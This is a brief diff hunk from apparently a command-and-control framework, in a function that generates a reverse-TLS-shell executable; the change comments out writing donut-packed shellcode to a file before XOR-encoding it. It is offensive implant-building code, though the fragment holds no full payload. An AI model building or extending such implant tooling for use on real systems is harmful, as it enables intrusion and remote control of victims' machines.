@@ -150,8 +150,8 @@ def generate_exe_reverse_tls(ip, port, stager_ip, stager_port):
 		with open(sc_path, "rb") as f:
 			donut_file = f.read()
 
-		with open("/home/kali/tools/C2/Gunner/gunnerc2/implantdev/learning/c-reverse-shell/rveshell/new/donut_file.c", "wb") as f:
-			f.write(donut_file) 
+		"""with open("/home/kali/tools/C2/Gunner/gunnerc2/implantdev/learning/c-reverse-shell/rveshell/new/donut_file.c", "wb") as f:
+			f.write(donut_file)"""
 
 		# 6) XOR‑encode it using our XorEncode helper
 		encoder = XorEncode()
